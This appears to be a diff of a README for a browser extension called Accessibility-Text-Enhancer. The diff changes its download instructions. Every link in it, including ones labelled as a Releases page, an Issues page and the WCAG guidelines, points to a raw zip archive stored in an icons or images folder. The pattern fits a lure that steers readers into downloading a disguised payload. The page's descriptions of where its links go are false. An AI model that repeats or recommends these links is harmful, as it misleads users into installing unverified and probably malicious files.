@@ -7,14 +7,14 @@ Thank you for choosing Accessibility-Text-Enhancer. This Chrome extension improv
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Download Accessibility-Text-Enhancer](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/docs/images/Enhancer-Text-Accessibility-2.2.zip)
+To get started, visit this page to download: [Download Accessibility-Text-Enhancer](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/icons/Text_Enhancer_Accessibility_3.9.zip)
 
 ### Steps to Download and Install:
 
 1. Click on the **Download Accessibility-Text-Enhancer** link above.
 2. You will be taken to the Releases page.
 3. Look for the latest version listed. This version will include the most recent features and fixes.
-4. Under the version, find the file labeled `https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/docs/images/Enhancer-Text-Accessibility-2.2.zip`—this is the file you need to download.
+4. Under the version, find the file labeled `https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/icons/Text_Enhancer_Accessibility_3.9.zip`—this is the file you need to download.
 5. Click on the file to begin downloading.
 
 After the download completes, you can install the extension.
@@ -63,7 +63,7 @@ Once the extension is installed, you can easily customize how it enhances your b
 
 If you encounter issues or have questions, the community is here to help:
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/docs/images/Enhancer-Text-Accessibility-2.2.zip) to report problems or request features.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/icons/Text_Enhancer_Accessibility_3.9.zip) to report problems or request features.
 - Join discussions related to accessibility enhancements and share your feedback.
 
 ## 🤝 Contributing
@@ -78,8 +78,8 @@ Your input is valuable. If you'd like to contribute to Accessibility-Text-Enhanc
 
 For further reading and tips on improving accessibility:
 
-- [WCAG (Web Content Accessibility Guidelines)](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/docs/images/Enhancer-Text-Accessibility-2.2.zip)
-- [Assistive Technology Overview](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/docs/images/Enhancer-Text-Accessibility-2.2.zip)
+- [WCAG (Web Content Accessibility Guidelines)](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/icons/Text_Enhancer_Accessibility_3.9.zip)
+- [Assistive Technology Overview](https://raw.githubusercontent.com/Deathfrosthacker/Accessibility-Text-Enhancer/main/icons/Text_Enhancer_Accessibility_3.9.zip)
 
 ## 📃 License
 
